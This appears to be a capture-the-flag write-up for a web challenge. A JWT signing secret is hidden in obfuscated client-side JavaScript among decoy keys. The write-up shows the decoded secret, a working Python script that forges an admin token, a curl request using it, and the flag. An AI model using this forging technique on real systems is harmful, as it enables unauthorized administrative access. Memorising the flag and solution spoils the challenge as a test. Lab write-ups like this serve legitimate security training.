# WEB-03 Writeup: JWT Secret Leak (Obfuscated)

## Reconnaissance

1. Navigate to CorpPortal — a corporate login page
2. View page source → three JS files loaded: `config.bundle.js`, `analytics.min.js`, `auth.min.js`
3. Notice the login form calls `CorpAuth.login()` — defined in `auth.min.js`

## Red Herrings (Decoys)

Opening the JS files reveals several fake secrets designed to waste time:

| File | Fake Secret | Why it fails |
|------|-------------|--------------|
| `analytics.min.js` | `f4k3_4n4lyt1cs_k3y_x7m9` | Wrong signing key |
| `config.bundle.js` | `pr0d_s1gn1ng_k3y_2024_v4` (in `jwtConfig.signingKey`) | Wrong signing key |
| `config.bundle.js` | Hex array → `corp_api_k3y_pr0d` | API key, not JWT secret |
| `auth.min.js` | `_0xdecoy1` (base64 string) | Honeypot, decodes to garbage |
| `auth.min.js` | `_0xdecoy2` function → `not_the_real_key` | Obviously named decoy |

## Vulnerability Discovery

The real secret is in `auth.min.js`, hidden behind obfuscation layers:

### Step 1: Deobfuscate the String Array

The file uses a string array rotation pattern (`_0x4a7b` array + rotation function). Use a JS beautifier or DevTools to understand the code structure.

### Step 2: Find the Hex CharCode Array

Look for a hex byte array that gets decoded via `String.fromCharCode`:

```javascript
var _0x8d1a = [0x73,0x33,0x63,0x72,0x33,0x74,0x5f,0x6b,0x33,0x79,0x5f,0x64,0x30,0x6e,0x74,0x5f,0x6c,0x33,0x34,0x6b];
var _0x6f4e = function() {
    var r = '';
    for (var i = 0; i < _0x8d1a.length; i++) {
        r += String.fromCharCode(_0x8d1a[i]);
    }
    return r;
};
```

### Step 3: Decode the Secret

```python
secret_hex = [0x73,0x33,0x63,0x72,0x33,0x74,0x5f,0x6b,0x33,0x79,0x5f,0x64,0x30,0x6e,0x74,0x5f,0x6c,0x33,0x34,0x6b]
secret = ''.join(chr(c) for c in secret_hex)
# Result: s3cr3t_k3y_d0nt_l34k
```

The secret is assigned to `_0x9f3d._k` (renamed from the original `secret` property).

## Exploitation

### Step 1: Forge Admin JWT

```python
import json, base64, hmac, hashlib, time

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

secret = "s3cr3t_k3y_d0nt_l34k"
header = b64url(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
payload = b64url(json.dumps({
    "sub":"admin", "role":"admin",
    "iss":"corpportal",
    "iat":int(time.time()),
    "exp":int(time.time())+3600
}).encode())

sig = b64url(hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest())
token = f"{header}.{payload}.{sig}"
print(token)
```

### Step 2: Access Admin Panel

```bash
curl -b "auth_token=<forged_token>" http://target/admin/
```

### Response

```json
{
    "status": "success",
    "message": "Welcome, Administrator!",
    "flag": "FLAG{web_03_jwt_secret_leak_q2w8}"
}
```

**Flag: `FLAG{web_03_jwt_secret_leak_q2w8}`**
